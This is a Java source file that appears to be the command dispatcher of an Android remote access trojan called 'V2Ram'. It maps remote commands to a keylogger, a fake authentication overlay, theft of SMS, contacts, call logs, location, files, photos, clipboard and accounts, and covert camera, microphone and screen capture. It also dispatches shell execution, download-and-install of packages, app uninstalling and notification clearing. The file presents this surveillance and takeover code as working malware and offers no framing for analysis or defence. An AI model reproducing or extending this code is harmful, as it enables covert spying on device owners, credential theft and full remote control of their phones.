// language: Java, file: CommandDispatch.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;

import java.util.ArrayList;
import java.util.List;

public class CommandDispatch {

    public static void dispatch(String raw) {
        if (raw == null || raw.isEmpty()) return;
        String text = raw.trim();
        String[] parts = text.split("\\s+", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";

        try {
            if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) {
                SyncChannel.send(menu());
                return;
            }
            if (cmd.equals("/ping")) {
                SyncChannel.send("pong — acc=" + (UiService.S != null)
                    + " svc=" + SyncChannel.running
                    + " keylog=" + InputObserver.isEnabled());
                return;
            }
            handle(cmd, args);
        } catch (Throwable t) {
            err(t.getMessage());
        }
    }

    static void handle(String cmd, String args) {
        switch (cmd) {

            // ---- UI ----
            case "/home":    InputAutomation.home(); break;
            case "/back":    InputAutomation.back(); break;
            case "/recents": InputAutomation.recents(); break;
            case "/lock":    InputAutomation.lock(); break;
            case "/shade":   InputAutomation.shade(); break;
            case "/qs":      InputAutomation.qs(); break;

            case "/tap": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /tap X Y"); return; }
                float x = parseCoord(p.get(0));
                float y = parseCoord(p.get(1));
                if (x < 0 || y < 0) { err("bad coords: " + p); return; }
                InputAutomation.tap(x, y);
                break;
            }
            case "/swipe": {
                List<String> p = split(args);
                if (p.size() < 4) { err("usage: /swipe X1 Y1 X2 Y2 [ms]"); return; }
                float x1 = parseCoord(p.get(0)), y1 = parseCoord(p.get(1));
                float x2 = parseCoord(p.get(2)), y2 = parseCoord(p.get(3));
                if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                    err("bad coords: " + p); return;
                }
                long ms = p.size() > 4 ? parseLong(p.get(4), 300) : 300;
                InputAutomation.swipe(x1, y1, x2, y2, ms);
                break;
            }
            case "/type":  InputAutomation.type(args); break;
            case "/click": InputAutomation.click(args); break;

            // ---- Screen ----
            case "/shot": {
                String s = DisplayCapture.shot();
                if (s == null) err("shot failed (accessibility + screenshot?)");
                else SyncChannel.sendPhoto(s);
                break;
            }
            case "/rec": {
                int sec = parseInt(args.trim(), 5);
                DisplayCapture.rec(sec);
                SyncChannel.send("<i>rec started: " + sec + "s</i>");
                break;
            }

            // ---- Overlay / toast ----
            case "/overlay": AuthOverlay.show(); break;
            case "/hide":    AuthOverlay.hide(); break;
            case "/toast":   NotificationToast.show(args); break;

            // ---- Data ----
            case "/sms":      SyncSms.dump(); break;
            case "/sms_send": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /sms_send NUM TEXT"); return; }
                String num = p.get(0);
                String body = args.substring(num.length()).trim();
                SyncSms.sendSms(num, body);
                break;
            }
            case "/contacts": ContactSync.dump(); break;
            case "/calls":    CallHistorySync.dump(); break;
            case "/gps":      LocationReader.fetch(); break;
            case "/files":    FileTransfer.list(args); break;
            case "/get":      FileTransfer.get(args.trim()); break;
            case "/photos":   MediaLibrary.listRecent(parseInt(args.trim(), 20)); break;
            case "/photo":    MediaLibrary.download(parseLong(args.trim(), 0)); break;

            // ---- Media ----
            case "/cam": LensCapture.frontShot(); break;
            case "/mic": AudioCapture.record(parseInt(args.trim(), 5)); break;

            // ---- Actions ----
            case "/open":      AppManager.openUrl(args.trim()); break;
            case "/app":       AppManager.open(args.trim()); break;
            case "/uninstall": AppManager.uninstall(args.trim()); break;
            case "/call":      AppManager.call(args.trim()); break;
            case "/vib":       AppManager.vibrate(parseInt(args.trim(), 1)); break;
            case "/torch": {
                String a = args.trim().toLowerCase();
                LensCapture.torch(a.equals("on") || a.equals("1") || a.equals("true"));
                break;
            }
            case "/apps": AppManager.list(); break;

            // ---- Extended ----
            case "/info":    SystemInfo.dump(); break;
            case "/wifi":    SystemInfo.wifi(); break;
            case "/sh":      CmdRunner.run(args); break;
            case "/clip":    ClipReader.read(); break;
            case "/clipset": ClipReader.write(args); break;
            case "/dl":      PackageUpdater.downloadAndInstall(args.trim()); break;
            case "/notifclear":  NotificationControl.clearAll(); break;
            case "/notifcancel": NotificationControl.cancelPkg(args.trim()); break;
            case "/accounts":    AccountLister.dump(); break;
            case "/keylog": {
                String a = args.trim().toLowerCase();
                if (a.equals("on"))         InputObserver.toggle(true);
                else if (a.equals("off"))   InputObserver.toggle(false);
                else if (a.equals("dump"))  InputObserver.dump();
                else if (a.equals("clear")) InputObserver.clear();
                else SyncChannel.send("<i>usage: /keylog on|off|dump|clear</i>");
                break;
            }

            default:
                SyncChannel.send("<i>unknown:</i> " + SyncChannel.esc(cmd)
                    + "\n/menu — all commands");
        }
    }

    static void err(String msg) {
        SyncChannel.send("<i>err:</i> " + SyncChannel.esc(msg == null ? "?" : msg));
    }

    static String menu() {
        StringBuilder b = new StringBuilder();
        b.append("<b>V2Ram — Android</b>\n")
         .append("<i>device: ").append(android.os.Build.MANUFACTURER)
         .append(" ").append(android.os.Build.MODEL)
         .append(" · sdk ").append(android.os.Build.VERSION.SDK_INT)
         .append("</i>\n\n")

         .append("<b>UI</b>\n")
         .append("/home /back /recents /lock /shade /qs\n")
         .append("/tap X Y · /swipe X1 Y1 X2 Y2 [ms]\n")
         .append("/type TEXT · /click TEXT\n\n")

         .append("<b>Screen</b>\n")
         .append("/shot · /rec N\n\n")

         .append("<b>Overlay</b>\n")
         .append("/overlay · /hide · /toast TEXT\n\n")

         .append("<b>Data</b>\n")
         .append("/sms · /contacts · /calls · /gps\n")
         .append("/sms_send NUM TEXT\n")
         .append("/files DIR · /get PATH\n")
         .append("/apps · /photos N · /photo ID\n\n")

         .append("<b>Media</b>\n")
         .append("/cam · /mic N · /torch on|off\n\n")

         .append("<b>Actions</b>\n")
         .append("/open URL · /app PKG · /uninstall PKG\n")
         .append("/call NUM · /vib N\n\n")

         .append("<b>Extended</b>\n")
         .append("/info · /wifi · /sh CMD\n")
         .append("/clip · /clipset TEXT\n")
         .append("/dl URL · /accounts\n")
         .append("/notifclear · /notifcancel PKG\n")
         .append("/keylog on|off|dump|clear");

        return b.toString();
    }

    static List<String> split(String args) {
        List<String> out = new ArrayList<>();
        if (args == null || args.isEmpty()) return out;
        for (String p : args.split("\\s+")) if (!p.isEmpty()) out.add(p);
        return out;
    }

    static int parseInt(String s, int fallback) {
        try { return Integer.parseInt(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static long parseLong(String s, long fallback) {
        try { return Long.parseLong(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static float parseCoord(String s) {
        if (s == null) return -1f;
        String t = s.trim().toLowerCase();
        if (t.startsWith("x") || t.startsWith("y")) t = t.substring(1);
        if (t.startsWith("=")) t = t.substring(1);
        try { return Float.parseFloat(t); }
        catch (Throwable ex) { return -1f; }
    }

    static Context ctx() { return SyncChannel.ctx; }
} 